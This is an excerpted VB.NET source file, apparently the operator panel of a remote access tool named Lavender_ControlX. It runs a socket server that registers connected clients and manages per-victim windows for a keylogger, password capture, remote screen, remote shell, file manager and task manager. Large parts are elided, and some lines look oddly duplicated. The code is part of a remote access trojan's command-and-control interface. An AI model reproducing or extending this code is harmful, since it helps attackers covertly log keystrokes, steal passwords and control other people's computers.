...
Imports Lavender_ControlX.Func
...
#Region "Initial Vars"
    ...
    ''' General tick timer
    ''' </summary>
    Public WithEvents Second As New DispatcherTimer
    ''' <summary>
    ''' Server instance
    ''' </summary>
...
#End Region
    ...
    Private Sub MainWindow_Closing(sender As Object, e As ComponentModel.CancelEventArgs) Handles MyBase.Closing, MyBase.Closing, MyBase.Closing
        WriteToLog("Exiting application")
        My.Settings.Save()
        For Each x As ListViewItem In L1.Items
            S.Disconnect(x.ToolTip)
        Next
        S.stops()
        Application.Current.Shutdown()
    End Sub

    Private Sub MainWindow_Activated(sender As Object, e As EventArgs) Handles MyBase.Activated, MyBase.Activated
        S = New SocketServer
        'Turn on the update timer
        Second.IsEnabled = True
        Second.Interval = New TimeSpan(100)
        Second.Start()
        ''ErrorLabel.Text = ""
    ...
    Public Sub FreezeForms(ByVal cli As Client)
        Dim openWindows = Application.Current.Windows
        Try
            If OpenForms(openWindows, n.opentaskman & cli.ID) IsNot Nothing Then
                Dim f As TaskMan = OpenForms(openWindows, n.opentaskman & cli.ID)
                disc(f.CMenu)
                disc(f.KillButton)
                disc(f.RefreshButton)
                disc(f.NewButton)
            End If
            If OpenForms(openWindows, n.openklog & cli.ID) IsNot Nothing Then
                Dim f As KeyLogger = OpenForms(openWindows, n.openklog & cli.ID)
                disc(f.RefreshButton)
                disc(f.ClearButton)
            End If
            If OpenForms(openWindows, n.openutil & cli.ID) IsNot Nothing Then
                Dim f As Utilities = OpenForms(openWindows, n.openutil & cli.ID)
                disc(f)
            End If
            If OpenForms(openWindows, n.openpasswords & cli.ID) IsNot Nothing Then
                Dim f As Passwords = OpenForms(openWindows, n.openpasswords & cli.ID)
                ''Nothing for now
            End If
            If OpenForms(openWindows, n.openscreen & cli.ID) IsNot Nothing Then
                Dim f As Remote = OpenForms(openWindows, n.openscreen & cli.ID)
                disc(f.ToggleButton)
                disc(f.M)
                disc(f.C1)
                disc(f.C2)
            ...
            End If
            If OpenForms(openWindows, n.openfileman & cli.ID) IsNot Nothing Then
                Dim f As FileManager = OpenForms(openWindows, n.openfileman & cli.ID)
                disc(f.HomeButton)
                disc(f.RefreshButton)
                disc(f.UpButton)
                disc(f.GoButton)
            ...
            End If
            If OpenForms(openWindows, n.openshell & cli.ID) IsNot Nothing Then
                Dim f As Shell = OpenForms(openWindows, n.openshell & cli.ID)
    ...
    Private Sub Second_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Second.Tick
        ...
        If Spinner.IsVisible = True Then
            ...
            Select Case A(0)
                ...
                Case n.getinfo ' Client Sent the PC name/info
                    ...
                    If L Is Nothing Then
                        L = L1.Items(L1.Items.Add(New ClientContext() With {.Socket = cli.Socket, .Id = A(1), .Location = GetCountryNumber(UCase(A(3))), .Picture = "zz.png"}))
